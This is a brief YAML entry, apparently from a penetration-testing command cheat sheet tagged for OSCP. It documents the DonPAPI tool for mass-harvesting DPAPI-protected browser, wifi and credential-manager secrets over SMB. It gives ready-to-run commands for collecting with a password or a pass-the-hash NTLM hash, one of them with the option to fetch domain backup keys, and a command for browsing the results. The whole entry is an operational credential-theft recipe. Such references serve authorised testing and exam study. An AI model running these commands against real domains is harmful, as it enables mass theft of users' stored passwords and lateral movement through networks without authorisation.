---
variants:
  - label: creds
    command: |
      donpapi collect -u $USER -p $PASSWORD -d $DOMAIN --dc-ip $DCIP -t ALL
  - label: hash
    command: |
      donpapi collect -u $USER -H ':$HASH' -d $DOMAIN --dc-ip $DCIP -t ALL --fetch-pvk
  - label: browse
    command: |
      donpapi browse
description: Mass harvest DPAPI protected browser, wifi, and credential manager secrets across hosts
os: [Linux]
category: [oscp, cli]
have: [hash]
service: [SMB]
phase: [CredAccess]
references:
  - https://github.com/login-securite/DonPAPI
---
